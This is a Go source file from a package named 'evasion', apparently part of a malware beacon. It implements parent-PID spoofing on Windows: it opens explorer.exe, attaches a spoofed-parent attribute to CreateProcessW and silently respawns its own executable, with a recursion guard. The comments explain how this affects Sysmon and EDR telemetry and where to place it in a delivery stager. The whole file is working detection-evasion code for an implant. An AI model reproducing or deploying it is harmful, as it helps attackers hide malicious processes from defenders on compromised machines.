//go:build windows

package evasion

import (
	"errors"
	"fmt"
	"os"
	"syscall"
	"unsafe"
)

// Win32 constants. Names match the SDK headers so the correspondence
// is obvious to anyone who has read them.
const (
	createUnicodeEnvironment         = 0x00000400
	createNoWindow                   = 0x08000000
	extendedStartupInfoPresent       = 0x00080000
	processCreateProcess             = 0x0080
	procThreadAttributeParentProcess = 0x00020000
)

var (
	ppKernel32 = syscall.NewLazyDLL("kernel32.dll")
	ppUser32   = syscall.NewLazyDLL("user32.dll")

	procInitializeProcThreadAttributeList = ppKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = ppKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = ppKernel32.NewProc("DeleteProcThreadAttributeList")
	procCreateProcessW                    = ppKernel32.NewProc("CreateProcessW")
	procOpenProcess                       = ppKernel32.NewProc("OpenProcess")
	procCloseHandle                       = ppKernel32.NewProc("CloseHandle")
	procGetShellWindow                    = ppUser32.NewProc("GetShellWindow")
	procGetWindowThreadProcessID          = ppUser32.NewProc("GetWindowThreadProcessId")
)

// startupInfoExW mirrors STARTUPINFOEXW on amd64. Do not reorder
// the fields — the layout is what CreateProcessW reads.
type startupInfoExW struct {
	Cb            uint32
	_             uint32
	Reserved      *uint16
	Desktop       *uint16
	Title         *uint16
	X             uint32
	Y             uint32
	XSize         uint32
	YSize         uint32
	XCountChars   uint32
	YCountChars   uint32
	FillAttribute uint32
	Flags         uint32
	ShowWindow    uint16
	Reserved2     uint16
	_             uint32
	Reserved2Ptr  *byte
	StdInput      syscall.Handle
	StdOutput     syscall.Handle
	StdError      syscall.Handle
	AttributeList uintptr
}

type processInformation struct {
	Process   syscall.Handle
	Thread    syscall.Handle
	ProcessID uint32
	ThreadID  uint32
}

// PPIDSpoof spawns a copy of this executable with explorer.exe as its
// spoofed parent, then returns. The caller MUST exit when the
// returned spawned value is true — otherwise two copies of the beacon
// run concurrently.
//
//	spawned, err := evasion.PPIDSpoof()
//	if spawned {
//	    os.Exit(0)
//	}
//	// err != nil or spawned == false: continue in the original process.
//
// The child is identified by the environment variable _TNPP=1, which
// the parent sets explicitly. The child sees the variable and skips
// the respawn, preventing infinite recursion.
//
// Caveats:
//
//   - Parent and child briefly coexist. Any process-creation
//     telemetry that fires in the window between CreateProcessW and
//     the parent's os.Exit sees two instances of the same binary. On
//     some EDRs this is a stronger signal than a plain parent
//     mismatch would have been.
//
//   - Session 0 (services) has no shell window. findSpoofParent
//     returns an error in that context, and the caller continues in
//     the original process.
//
//   - The spoof changes what Sysmon EventID 1 reports as the creator.
//     It does not change the child's token, integrity level, or
//     signing status. Anyone can walk the process tree with
//     NtQueryInformationProcess and see the real parent.
//
// For these reasons, when the delivery vector is a macro, scheduled
// task, or service, the parent spoof belongs in the delivery stager
// rather than the beacon.
func PPIDSpoof() (bool, error) {
	if os.Getenv("_TNPP") == "1" {
		return false, nil
	}

	parentPid, err := findSpoofParent()
	if err != nil {
		return false, err
	}

	hParent, err := openProcessForSpoof(parentPid)
	if err != nil {
		return false, err
	}
	defer procCloseHandle.Call(uintptr(hParent))

	attrList, cleanupAttr, err := buildParentAttributeList(hParent)
	if err != nil {
		return false, err
	}
	defer cleanupAttr()

	exePath, err := os.Executable()
	if err != nil {
		return false, fmt.Errorf("locate own executable: %w", err)
	}

	envBlock, err := buildUnicodeEnvBlock()
	if err != nil {
		return false, err
	}

	return spawnWithSpoofedParent(exePath, envBlock, attrList)
}

// findSpoofParent returns the PID of the shell (usually explorer.exe).
// In session 0 there is no shell and the function reports an error
// rather than picking an arbitrary PID.
func findSpoofParent() (uint32, error) {
	hwnd, _, _ := procGetShellWindow.Call()
	if hwnd == 0 {
		return 0, errors.New("no shell window (likely session 0)")
	}
	var pid uint32
	procGetWindowThreadProcessID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
	if pid == 0 {
		return 0, errors.New("shell pid not found")
	}
	return pid, nil
}

// openProcessForSpoof opens the shell process with just enough rights
// to use it as the parent of a new process.
func openProcessForSpoof(pid uint32) (syscall.Handle, error) {
	h, _, errno := procOpenProcess.Call(
		processCreateProcess, 0, uintptr(pid))
	if h == 0 {
		return 0, fmt.Errorf("OpenProcess(pid=%d): %w", pid, errno)
	}
	return syscall.Handle(h), nil
}

// buildParentAttributeList prepares a PROC_THREAD_ATTRIBUTE_LIST
// carrying PROC_THREAD_ATTRIBUTE_PARENT_PROCESS. The returned cleanup
// must be called once the attribute list has been consumed by
// CreateProcessW.
func buildParentAttributeList(hParent syscall.Handle) (
	uintptr, func(), error,
) {
	var size uintptr
	procInitializeProcThreadAttributeList.Call(0, 1, 0,
		uintptr(unsafe.Pointer(&size)))
	if size == 0 {
		return 0, nil, errors.New("attribute list size probe failed")
	}

	buf := make([]byte, size)
	list := uintptr(unsafe.Pointer(&buf[0]))

	r, _, errno := procInitializeProcThreadAttributeList.Call(
		list, 1, 0, uintptr(unsafe.Pointer(&size)))
	if r == 0 {
		return 0, nil, fmt.Errorf("InitializeProcThreadAttributeList: %w",
			errno)
	}

	r, _, errno = procUpdateProcThreadAttribute.Call(
		list, 0,
		procThreadAttributeParentProcess,
		uintptr(unsafe.Pointer(&hParent)),
		unsafe.Sizeof(hParent),
		0, 0)
	if r == 0 {
		procDeleteProcThreadAttributeList.Call(list)
		return 0, nil, fmt.Errorf("UpdateProcThreadAttribute: %w", errno)
	}

	cleanup := func() {
		procDeleteProcThreadAttributeList.Call(list)
	}
	return list, cleanup, nil
}

// buildUnicodeEnvBlock returns the current environment plus a marker
// variable, encoded as a UTF-16 double-null-terminated block. The
// slice is returned (not a *uint16 into it) so the caller keeps the
// backing array alive until CreateProcessW has finished reading it.
func buildUnicodeEnvBlock() ([]uint16, error) {
	env := append(os.Environ(), "_TNPP=1")

	var block []uint16
	for _, entry := range env {
		u, err := syscall.UTF16FromString(entry)
		if err != nil {
			return nil, fmt.Errorf("encode env %q: %w", entry, err)
		}
		block = append(block, u...)
	}
	block = append(block, 0)
	return block, nil
}

// spawnWithSpoofedParent performs the CreateProcessW call with the
// attribute list attached to STARTUPINFOEXW. The child inherits the
// parent's handles, so no stdout/stderr plumbing is required here.
func spawnWithSpoofedParent(exe string, envBlock []uint16,
	attrList uintptr) (bool, error) {

	// Quote the executable path. CreateProcessW is called with a
	// NULL lpApplicationName, which means it parses the command
	// line as whitespace-separated argv. An unquoted path
	// containing a space (C:\Program Files\..., C:\Users\<name with
	// space>\...) splits at the first space and the spawn fails with
	// ERROR_FILE_NOT_FOUND. The Go side sees the error and the
	// beacon continues in the original process, silently giving up
	// the spoof.
	cmdLine, err := syscall.UTF16FromString(`"` + exe + `"`)
	if err != nil {
		return false, fmt.Errorf("encode command line: %w", err)
	}

	var si startupInfoExW
	si.Cb = uint32(unsafe.Sizeof(si))
	si.AttributeList = attrList

	var pi processInformation

	r, _, errno := procCreateProcessW.Call(
		0, // lpApplicationName: NULL means derive from lpCommandLine
		uintptr(unsafe.Pointer(&cmdLine[0])),
		0, 0, 0,
		// CREATE_UNICODE_ENVIRONMENT is required because the env block
		// is UTF-16. Omitting it makes Windows interpret the block as
		// ANSI, which corrupts every variable and silently drops the
		// _TNPP recursion guard.
		extendedStartupInfoPresent|createNoWindow|createUnicodeEnvironment,
		uintptr(unsafe.Pointer(&envBlock[0])),
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if r == 0 {
		return false, fmt.Errorf("CreateProcessW: %w", errno)
	}

	procCloseHandle.Call(uintptr(pi.Process))
	procCloseHandle.Call(uintptr(pi.Thread))
	return true, nil
}